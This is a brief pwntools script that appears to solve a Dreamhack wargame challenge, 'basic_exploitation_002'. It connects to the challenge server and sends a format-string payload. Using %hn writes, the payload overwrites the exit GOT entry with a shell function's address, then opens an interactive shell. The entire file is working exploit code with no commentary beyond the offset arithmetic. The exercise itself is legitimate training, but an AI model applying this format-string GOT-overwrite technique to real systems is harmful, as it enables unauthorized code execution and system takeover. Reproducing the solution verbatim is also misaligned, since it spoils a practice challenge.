from pwn import *

p = remote('host3.dreamhack.games', '16468')
#p = process('./basic_exploitation_002')

shell = 0x08048609
exit_got = 0x804a024

'''
exit_got + 2    -> 0x0804 = 2052 - 8 = 2044
exit_got        -> 0x8609 = 34313 - 8 - 2044 = 32261
'''

payload = p32(exit_got+2) + p32(exit_got) + b"%2044c%1$hn" + b"%32261c%2$hn"

p.sendline(payload)

p.interactive()